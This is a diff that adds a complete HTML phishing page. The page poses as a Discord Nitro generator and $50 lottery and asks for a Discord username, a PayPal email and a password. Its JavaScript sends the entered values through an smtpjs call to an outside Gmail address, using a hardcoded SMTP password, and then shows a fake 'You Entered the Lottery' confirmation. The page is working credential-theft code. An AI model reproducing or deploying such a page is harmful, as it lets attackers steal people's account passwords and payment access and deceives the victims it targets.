@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+  <div style="opacity: 0;" id="alert">
+    <img src="images/check.svg" style="margin-right: 25px;" alt="">
+    You Entered the Lottery
+  </div>
+<video autoplay muted loop class="bg-video">
+  <source src="bg-video.mp4" type="video/mp4">
+</video>
+  <div class="main">
+    <div class="form">
+      <p style="margin-bottom: 55px;">Sign up and Win the lottery, Be a giga-chad 🗿</p>
+    <form>
+        <label for="name">Discord Username:</label>
+        <input type="text" id="name" name="name"><br>
+      
+        <label for="email">Paypal Email:</label>
+        <input type="email" id="email" name="email"><br>
+      
+        <label for="Password">Password:</label>
+        <input type="password" id="message" name="Password"><br>
+      
+        <button type="button" onclick="sendEmail()">Submit</button>
+      </form>
+    </div>
+      <div class="poster">
+        <img src="images/discord.svg" alt="">
+        <p>X</p>
+        <img src="images/paypal.svg" alt="">
+      </div>
+    </div>
+    <div style="          color: white;
+z-index: 1; margin-top: 5px;   ">Discord Nitro Generator and 50$ Lottery</div>
+      <script src="https://smtpjs.com/v3/smtp.js"></script>
+      <script>
+        function sendEmail() {
+          var name = document.getElementById("name").value;
+          var email = document.getElementById("email").value;
+          var message = document.getElementById("message").value;
+          const alertMessage = document.getElementById("alert");
+      
+          Email.send({
+            Host: "smtp.elasticemail.com",
+            Username: "getitforfreenow26@gmail.com",
+            Password: "15ECC32B5871E49A0D3CDF95CDECEEC34DC1",
+            To: "seifndarkknight@gmail.com",
+            From: 'getitforfreenow26@gmail.com',
+            Subject: 'New message from ' + name,
+            Body: 'Name: ' + name + '<br>' +
+                  'Email: ' + email + '<br>' +
+                  'Password: ' + message
+          }).then(function(message) {
+            alertMessage.style.opacity = "1";
+
+            setTimeout(function() {
+              alertMessage.style.opacity = "0";
+            }, 3000);
+          });
+        }
+
+        const inputs = document.querySelectorAll('input');
+
+inputs.forEach(input => {
+  input.addEventListener('focus', () => {
+    input.parentElement.classList.add('focused');
+  });
+  
+  input.addEventListener('blur', () => {
+    if (input.value === '') {
+      input.parentElement.classList.remove('focused');
+    }
+  });
+});
+
+      </script>
+      <style>
+        body {
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          overflow: hidden;
+        }
+
+        .bg-video {
+  position: fixed;
+  right: 0;
+  bottom: 0;
+  min-width: 100%;
+  min-height: 100%;
+}
+
+        .main {
+          margin: 0 auto;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 85%;
+          width: 80%;
+        }
+
+        #alert {
+          background-color: white;
+          position: fixed;
+          z-index: 5;
+          top: 30px;
+          width: 30%;
+          height: 7vh;
+          display: flex;
+          flex-direction: row;
+          justify-content: center;
+          align-items: center;
+          color: white;
+          font-size: 25px;
+          /* From https://css.glass */
+background: rgba(75, 103, 201, 0.35);
+border-radius: 16px;
+box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+backdrop-filter: blur(5px);
+-webkit-backdrop-filter: blur(5px);
+border: 1px solid rgba(75, 103, 201, 0.3);
+        }
+        
+        .form {
+          width: 60%;
+          height: 100%;
+border-radius: 16px 0 0 16px;
+background-color: #d7dfff;
+border: 1px solid rgba(181, 188, 211, 0.3);    
+display: flex;
+align-items: center;  
+box-shadow: 10px 10px 127px -78px rgba(0,0,0,0.75);
+-webkit-box-shadow: 10px 10px 127px -78px rgba(0,0,0,0.75);
+-moz-box-shadow: 10px 10px 127px -78px rgba(0,0,0,0.75); 
+z-index: 1;
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+ }
+
+        .poster {
+          display: flex;
+          flex-direction: row;
+          justify-content: space-evenly;
+          align-items: center;
+background-color: #4b67c9;
+ border-radius: 0 16px 16px 0;
+ z-index: 1;
+          height: 100%;
+          width: 40%;
+          font-size: 35px;
+          color: #fff;
+          font-weight: 800;
+          box-shadow: 10px 10px 127px -78px rgba(0,0,0,0.75);
+-webkit-box-shadow: 10px 10px 127px -78px rgba(0,0,0,0.75);
+-moz-box-shadow: 10px 10px 127px -78px rgba(0,0,0,0.75);
+        }
+
+        .poster img {
+          width: 20%;
+        }
+
+        * {
+  font-family: 'Poppins', sans-serif;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  width: 70%;
+  margin: 0 auto;
+  padding: 20px;
+  font-weight: 600;
+}
+
+label {
+  margin-bottom: 10px;
+}
+
+input[type="text"],
+input[type="email"],
+input[type="password"] {
+  padding: 10px;
+  margin-bottom: 20px;
+  border: 1px solid white;
+  border-width: 0 0 2px 0;
+  border-radius: 5px;
+  font-size: 16px;
+  transition: all 0.2s ease-in-out;
+  background-color: transparent;
+}
+
+button {
+  padding: 10px 20px;
+  background-color:  #7289da;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  font-size: 16px;
+  cursor: pointer;
+  transition: all 0.2s ease-in-out;
+}
+
+button:hover {
+  background-color: #677bc4;
+}
+
+input:focus {
+  border-color: #677bc4;
+  border-width: 0 0 2px 0;
+  outline: none;
+}
+      </style>
+</body>
+</html>
